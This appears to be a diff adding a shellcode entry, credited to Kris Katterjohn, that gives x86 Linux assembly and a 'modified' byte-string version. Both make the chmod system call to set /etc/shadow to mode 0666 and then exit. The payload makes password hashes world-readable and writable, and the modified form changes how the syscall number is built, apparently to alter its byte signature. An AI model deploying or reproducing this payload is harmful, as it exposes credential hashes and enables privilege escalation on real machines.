@@ -1,3 +1,24 @@
+Original shellcode by *Kris Katterjohn*.
+
+    section .text
+            global _start
+       _start:
+         xor edx, edx
+            push byte 15
+         pop eax
+         push edx
+         push byte 0x77
+         push word 0x6f64
+         push 0x6168732f
+         push 0x6374652f
+         mov ebx, esp
+         push word 0666Q
+         pop ecx
+         int 0x80
+            push byte 1
+         pop eax
+         int 0x80
+ 
 
 Modified:
 "\x6a\x10\x58\x83\xe8\x01\x99\x6a\x77\x66\x68\x64\x6f\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x89\xd1\x59\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
